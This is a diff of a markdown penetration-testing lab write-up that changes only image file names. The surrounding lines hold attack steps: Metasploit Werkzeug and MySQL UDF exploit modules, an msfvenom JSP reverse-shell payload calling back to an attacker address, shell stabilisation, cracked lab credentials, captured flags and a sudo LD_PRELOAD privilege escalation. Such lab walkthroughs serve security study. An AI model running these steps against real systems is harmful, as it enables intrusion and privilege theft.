@@ -120,13 +120,13 @@ use exploit/multi/http/werkzeug_debug_rce
 mysql -h 192.6.232.4 -u root -pfArFLP29UySm4bZj
 ```
 
-![](<../../../../.gitbook/assets/image (41) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (41) (1) (1) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (61) (1) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (9) (1).png>)
 
-![](<../../../../.gitbook/assets/image (11).png>)
+![](<../../../../.gitbook/assets/image (11) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (54) (1) (1) (1) (1).png>)
 
@@ -154,7 +154,7 @@ use exploit/multi/mysql/mysql_udf_payload
 dirb http://192.6.232.5:8080
 ```
 
-![](<../../../../.gitbook/assets/image (51) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (51) (1) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (19) (1) (1).png>)
 
@@ -182,7 +182,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.6.232.2 LPORT=6666 -f war -o re
 
 ![](<../../../../.gitbook/assets/image (36) (1) (1) (1).png>)
 
-![](<../../../../.gitbook/assets/image (30) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (30) (1) (1) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (10).png>)
 
@@ -204,7 +204,7 @@ stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38
 
 ![](<../../../../.gitbook/assets/image (17) (1) (1) (1).png>)
 
-![](<../../../../.gitbook/assets/image (42) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (42) (1) (1) (1).png>)
 
 ```
 robert:x:999:999:robert:/home/robert:
@@ -222,7 +222,7 @@ robert:robert@1234567890!@#
 username=robert | password=robert@1234567890!@#
 ```
 
-![](<../../../../.gitbook/assets/image (43) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (43) (1) (1) (1).png>)
 
 ![FLAG2: EC2986081E84BB845541D5CC0BEE13B3](<../../../../.gitbook/assets/image (6) (1).png>)
 
@@ -258,7 +258,7 @@ sudo LD_PRELOAD=pe.so <COMMAND> #Use any command you can run with sudo
 
 ![](<../../../../.gitbook/assets/image (16) (1).png>)
 
-![FLAG3: 560648FC63F090A8CF776326DC13FAC7](<../../../../.gitbook/assets/image (50) (1).png>)
+![FLAG3: 560648FC63F090A8CF776326DC13FAC7](<../../../../.gitbook/assets/image (50) (1) (1).png>)
 
 ## Resources
 
